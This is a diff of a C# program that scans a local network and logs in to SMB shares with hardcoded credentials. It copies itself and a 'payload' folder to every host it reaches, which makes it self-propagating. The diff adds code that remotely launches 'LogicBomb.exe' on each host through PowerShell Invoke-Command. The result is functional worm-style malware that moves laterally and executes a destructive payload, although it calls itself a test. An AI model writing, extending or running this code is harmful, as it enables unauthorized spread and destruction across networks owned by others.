@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
@@ -9,14 +10,15 @@ using System.Threading.Tasks;
 
 class Program
 {
-    // SMB login parameters
     private const string SMB_USERNAME = "user";
     private const string SMB_PASSWORD = "user";
     private const string SMB_SHARE_NAME = "SharedFolder";
+    private const string PAYLOAD_FOLDER_NAME = "payload";
+    private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";
 
     static async Task Main()
     {
-        Console.WriteLine("Starting IP Range, SMB Scan, and Self-Deployment Test...");
+        Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
         Console.WriteLine("-----------------------------------");
 
         string localIP = GetLocalIPAddress();
@@ -40,40 +42,53 @@ class Program
 
         Console.WriteLine($"[INFO] Found {smbHosts.Count} SMB host(s) with accessible shares.");
 
-        // Only now prepare deployment package
         string tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
         Console.WriteLine($"Preparing deployment package in temporary folder: {tempFolder}");
         PrepareDeploymentPackage(tempFolder);
 
         foreach (string ip in smbHosts)
         {
-            string remoteShare = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-            Console.WriteLine($"Attempting SMB login on {remoteShare}...");
+            string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
+            Console.WriteLine($"Attempting SMB login on {remoteShareUNC}...");
 
-            int result = ConnectToRemoteShare(remoteShare, SMB_USERNAME, SMB_PASSWORD);
-            if (result == 0)
+            int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
+            if (smbConnectResult == 0)
             {
                 Console.WriteLine($"[SMB SUCCESS] Connected to {ip}. Copying deployment files...");
-                await CopyFolderAsync(tempFolder, remoteShare);
-                Console.WriteLine($"[COPY OK] Files copied to {remoteShare}");
-                DisconnectFromRemoteShare(remoteShare);
+                await CopyFolderAsync(tempFolder, remoteShareUNC);
+                Console.WriteLine($"[COPY OK] Files copied to {remoteShareUNC}");
+
+                Console.WriteLine($"[REMOTE EXEC] Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip}...");
+
+                string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";
+
+                bool executionSuccess = await ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
+
+                if (executionSuccess)
+                {
+                    Console.WriteLine($"[REMOTE EXEC SUCCESS] '{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
+                }
+                else
+                {
+                    Console.WriteLine($"[REMOTE EXEC FAILED] Could not execute '{EXECUTABLE_TO_RUN}' on {ip}. Ensure PowerShell Remoting is enabled and credentials are correct.");
+                }
+
+                DisconnectFromRemoteShare(remoteShareUNC);
             }
             else
             {
-                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {result}");
+                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {smbConnectResult}");
             }
         }
 
         Console.WriteLine("-----------------------------------");
-        Console.WriteLine("Scan and deployment complete.");
+        Console.WriteLine("Scan, deployment, and remote execution complete.");
         Console.WriteLine($"[CLEANUP] Deleting temporary directory: {tempFolder}");
         Directory.Delete(tempFolder, true);
 
         Console.WriteLine("Press any key to exit.");
         Console.ReadKey();
     }
-
-    // ----------------------------- Helper Methods -----------------------------
 
     private static async Task<List<string>> FindSmbServersAsync(string baseIP)
     {
@@ -94,13 +109,15 @@ class Program
                     var reply = await ping.SendPingAsync(ip, 300);
                     if (reply.Status == IPStatus.Success)
                     {
-                        // Try connecting to SMB share quickly to verify SMB service
                         string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                         int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
                         if (result == 0)
                         {
                             Console.WriteLine($"[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
-                            activeHosts.Add(ip);
+                            lock (activeHosts)
+                            {
+                                activeHosts.Add(ip);
+                            }
                             DisconnectFromRemoteShare(smbPath);
                         }
                         else
@@ -109,7 +126,8 @@ class Program
                         }
                     }
                 }
-                catch { /* ignore ping exceptions */ }
+                catch (PingException) { }
+                catch (Exception ex) { Console.WriteLine($"[ERROR] {ip} - {ex.Message}"); }
                 finally { semaphore.Release(); }
             }));
         }
@@ -125,14 +143,14 @@ class Program
         string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);
 
-        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "payload");
+        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
         if (Directory.Exists(payloadFolder))
         {
-            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, "payload"));
+            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
         }
         else
         {
-            Console.WriteLine("WARNING: 'payload' folder not found, skipping copy.");
+            Console.WriteLine($"WARNING: '{PAYLOAD_FOLDER_NAME}' folder not found, skipping copy. Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
         }
 
         Console.WriteLine("Deployment package prepared successfully.");
@@ -164,7 +182,50 @@ class Program
         return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
     }
 
-    // ----------------------------- SMB API Calls -----------------------------
+    private static async Task<bool> ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
+    {
+        string psScript = $"Start-Process -FilePath \"{commandToExecute}\"";
+        string fullPsCommand = $"powershell.exe -Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ {psScript} }} }}\"";
+
+        try
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "powershell.exe";
+                process.StartInfo.Arguments = $"-Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' }} }}\"";
+
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+
+                Console.WriteLine($"[DEBUG] Executing PowerShell command: {process.StartInfo.Arguments}");
+
+                process.Start();
+                string output = await process.StandardOutput.ReadToEndAsync();
+                string error = await process.StandardError.ReadToEndAsync();
+                await Task.Run(() => process.WaitForExit(15000));
+
+                if (process.ExitCode == 0)
+                {
+                    Console.WriteLine($"[DEBUG] Remote execution output: {output}");
+                    return true;
+                }
+                else
+                {
+                    Console.WriteLine($"[ERROR] PowerShell process exited with code {process.ExitCode} for {remoteIp}.");
+                    Console.WriteLine($"[ERROR] Standard Output: {output}");
+                    Console.WriteLine($"[ERROR] Standard Error: {error}");
+                    return false;
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[ERROR] Exception during remote execution on {remoteIp}: {ex.Message}");
+            return false;
+        }
+    }
 
     [DllImport("mpr.dll")]
     private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);
@@ -176,7 +237,7 @@ class Program
     {
         var nr = new NETRESOURCE
         {
-            dwType = 1, // RESOURCETYPE_DISK
+            dwType = 1,
             lpRemoteName = remotePath
         };
         return WNetAddConnection2(ref nr, password, username, 0);
